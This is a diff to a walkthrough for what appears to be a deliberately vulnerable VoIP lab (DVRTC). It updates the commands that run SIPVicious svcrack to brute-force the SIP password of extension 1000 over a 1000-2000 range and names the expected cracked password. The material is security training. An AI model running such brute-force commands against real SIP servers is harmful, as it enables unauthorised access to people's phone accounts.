@@ -6,7 +6,7 @@ Use SIPVicious OSS `svcrack` to brute-force the weak SIP password for extension 
 
 ## Prerequisites
 
-- DVRTC running: `docker compose up -d`
+- DVRTC running: `./scripts/compose.sh --scenario pbx1 up -d`
 - SIPVicious OSS available in the `attacker` service
 
 ## Steps
@@ -19,12 +19,12 @@ Run on the host:
 . ./.env
 ```
 
-### Step 2: Brute-force extension 1000 online
+### Step 2: Run svcrack against extension 1000
 
 Run on the host:
 
 ```bash
-docker compose run --rm attacker sipvicious_svcrack -u 1000 -r 1000-2000 "udp://$PUBLIC_IPV4:5060"
+./scripts/compose.sh --scenario pbx1 run --rm attacker sipvicious_svcrack -u 1000 -r 1000-2000 "udp://$PUBLIC_IPV4:5060"
 ```
 
 Look for `1000` to be reported with password `1500`.
